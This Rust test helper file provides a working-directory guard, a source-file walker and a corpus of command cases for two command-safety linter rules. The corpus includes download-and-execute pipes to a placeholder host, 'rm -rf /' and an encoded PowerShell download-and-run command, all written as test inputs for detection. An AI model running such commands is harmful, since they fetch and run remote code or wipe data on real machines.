/// Test helper: RAII guard that restores the working directory on drop.
/// Ensures CWD is restored even if a test panics mid-execution.
pub struct CwdGuard(std::path::PathBuf);

impl CwdGuard {
    pub fn new() -> Self {
        Self(std::env::current_dir().unwrap())
    }
}

impl Drop for CwdGuard {
    fn drop(&mut self) {
        let _ = std::env::set_current_dir(&self.0);
    }
}

/// Return every Rust source file as a repository-`src/`-relative path and content.
pub fn source_files() -> Vec<(String, String)> {
    fn walk(dir: &std::path::Path, out: &mut Vec<(String, String)>, root: &std::path::Path) {
        for entry in std::fs::read_dir(dir).expect("src dir") {
            let path = entry.expect("src entry").path();
            if path.is_dir() {
                walk(&path, out, root);
            } else if path.extension().is_some_and(|extension| extension == "rs") {
                let relative = path.strip_prefix(root).expect("source under src root");
                out.push((
                    relative.to_string_lossy().replace('\\', "/"),
                    std::fs::read_to_string(&path).expect("source read"),
                ));
            }
        }
    }

    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("src");
    let mut files = Vec::new();
    walk(&root, &mut files, &root);
    files.sort();
    files
}

#[derive(Debug)]
pub struct ArgvCase {
    /// Executable token exactly as authored (may be a Windows path).
    pub command: &'static str,
    /// Arguments exactly as authored.
    pub args: &'static [&'static str],
    /// Expected H023 outcome; `None` means the shape is unsupported there.
    pub expect_h023_diagnostic: Option<bool>,
    /// Expected P019 outcome; `None` means the shape is unsupported there.
    pub expect_p019_diagnostic: Option<bool>,
}

/// Shared semantic-token corpus for the H023 and P019 command adapters.
pub fn argv_hard_negative_corpus() -> &'static [ArgvCase] {
    const CASES: &[ArgvCase] = &[
        ArgvCase {
            command: "echo",
            args: &["curl", "https://x", "|", "sh"],
            expect_h023_diagnostic: Some(false),
            expect_p019_diagnostic: Some(false),
        },
        ArgvCase {
            command: "echo",
            args: &["rm", "-rf", "/"],
            expect_h023_diagnostic: Some(false),
            expect_p019_diagnostic: Some(false),
        },
        ArgvCase {
            command: "printf",
            args: &["rm", "-rf", "/"],
            expect_h023_diagnostic: Some(false),
            expect_p019_diagnostic: Some(false),
        },
        ArgvCase {
            command: "git",
            args: &["reset", "--", "--hard"],
            expect_h023_diagnostic: Some(false),
            expect_p019_diagnostic: Some(false),
        },
        ArgvCase {
            command: "git",
            args: &["clean", "--", "--force"],
            expect_h023_diagnostic: Some(false),
            expect_p019_diagnostic: Some(false),
        },
        ArgvCase {
            command: "sudo",
            args: &["echo", "rm", "-rf", "/"],
            expect_h023_diagnostic: Some(false),
            expect_p019_diagnostic: Some(false),
        },
        ArgvCase {
            command: "rm",
            args: &["-r", "-f", "/tmp/x"],
            expect_h023_diagnostic: Some(true),
            expect_p019_diagnostic: Some(false),
        },
        ArgvCase {
            command: "rm",
            args: &["--recursive", "--force", "build"],
            expect_h023_diagnostic: Some(true),
            expect_p019_diagnostic: Some(false),
        },
        ArgvCase {
            command: "curl",
            args: &["https://x/i.sh", "|", "dash"],
            expect_h023_diagnostic: Some(true),
            expect_p019_diagnostic: Some(false),
        },
        ArgvCase {
            command: "wget",
            args: &["-qO-", "https://x", "|", "sudo", "-E", "bash"],
            expect_h023_diagnostic: Some(true),
            expect_p019_diagnostic: Some(false),
        },
        ArgvCase {
            command: r"C:\Windows\System32\cmd.exe",
            args: &["/c", "curl", "https://x", "|", "bash"],
            expect_h023_diagnostic: Some(false),
            expect_p019_diagnostic: Some(true),
        },
        ArgvCase {
            command: "powershell.exe",
            args: &[
                "-enc",
                "aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AeAAgAHwAIABpAGUAeAA=",
            ],
            expect_h023_diagnostic: Some(false),
            expect_p019_diagnostic: Some(true),
        },
        ArgvCase {
            command: r"C:\tools\rm.exe",
            args: &["-rf", "build"],
            expect_h023_diagnostic: Some(true),
            expect_p019_diagnostic: Some(false),
        },
    ];
    CASES
}
